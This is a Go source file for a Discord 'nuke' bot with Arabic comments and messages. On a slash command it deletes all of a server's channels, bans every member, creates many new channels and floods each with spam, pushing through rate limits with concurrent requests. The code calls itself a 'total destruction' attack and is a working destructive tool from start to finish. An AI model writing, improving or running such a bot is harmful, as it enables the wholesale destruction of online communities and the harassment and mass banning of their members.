package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		IdleConnTimeout:     60 * time.Second,
	},
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdNuke := "nuke"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "أمر التدمير الشامل الخارق",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة التي ستُرسل",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		if i.ApplicationCommandData().Name == cmdNuke {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ جاري تحضير الهجوم الشامل (3 ثواني للتحضير بالذاكرة)...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID
			botID := s.State.User.ID

			go executeTotalNuke(token, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	fmt.Println("🤖 بوت التدمير الشامل شغال وجاهز!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeTotalNuke(token, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	// 1. تجهيز بايلودات الرومات مسبقاً
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	// 2. تجهيز بايلود الرسائل
	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	// 3. سحب الأعضاء بالـ Pagination واستثناء البوت
	var allUserIDs []string
	after := ""
	for {
		members, err := s.GuildMembers(guildID, after, 1000)
		if err != nil || len(members) == 0 {
			break
		}
		for _, m := range members {
			if m != nil && m.User != nil {
				if m.User.ID != botID {
					allUserIDs = append(allUserIDs, m.User.ID)
				}
				after = m.User.ID
			}
		}
		if len(members) < 1000 {
			break
		}
	}

	// 4. جلب القنوات القديمة عبر مكتبة discordgo لضمان سلامة البيانات
	channels, err := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if err == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	// انتهاء الـ 3 ثواني للتحضير
	time.Sleep(3 * time.Second)

	// أ. حذف القنوات القديمة
	var wgDel sync.WaitGroup
	for _, id := range oldChannelIDs {
		wgDel.Add(1)
		go func(chID string) {
			defer wgDel.Done()
			delURL := "https://discord.com/api/v10/channels/" + chID
			for {
				delReq, _ := http.NewRequest("DELETE", delURL, nil)
				for k, v := range headers {
					delReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(delReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(100 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(id)
	}

	// ب. حظر الأعضاء
	var wgBan sync.WaitGroup
	for _, userID := range allUserIDs {
		wgBan.Add(1)
		go func(uid string) {
			defer wgBan.Done()
			banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
			for {
				banReq, _ := http.NewRequest("PUT", banURL, nil)
				for k, v := range headers {
					banReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(banReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(100 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(userID)
	}

	// ج. إنشاء الرومات الجديدة
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	for _, payload := range channelPayloads {
		wgCreate.Add(1)
		go func(p []byte) {
			defer wgCreate.Done()
			for {
				reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				for k, v := range headers {
					reqCreate.Header.Set(k, v)
				}

				resp, err := httpClient.Do(reqCreate)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(100 * time.Millisecond)
					}
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
						if chID, ok := chResult["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, chID)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
				break
			}
		}(payload)
	}
	wgCreate.Wait()

	// د. إرسال الرسائل بكل روم جديد بالتوازي
	var wgMsg sync.WaitGroup
	for _, chID := range newChannelIDs {
		wgMsg.Add(1)
		go func(chIDParam string) {
			defer wgMsg.Done()
			var wgInnerMsg sync.WaitGroup

			for m := 0; m < messagesCount; m++ {
				wgInnerMsg.Add(1)
				go func() {
					defer wgInnerMsg.Done()
					for {
						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
						for k, v := range headers {
							msgReq.Header.Set(k, v)
						}

						msgResp, err := httpClient.Do(msgReq)
						if err != nil {
							return
						}

						if msgResp.StatusCode == 429 {
							retryAfterStr := msgResp.Header.Get("Retry-After")
							msgResp.Body.Close()
							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
								time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
							} else {
								time.Sleep(100 * time.Millisecond)
							}
							continue
						}
						msgResp.Body.Close()
						break
					}
				}()
			}
			wgInnerMsg.Wait()
		}(chID)
	}

	// انتظار انتهاء كافة العمليات بالكامل
	wgDel.Wait()
	wgBan.Wait()
	wgMsg.Wait()
	fmt.Println("✅ انتهت عملية التدمير الشامل بالكامل وبأقصى سرعة!")
}
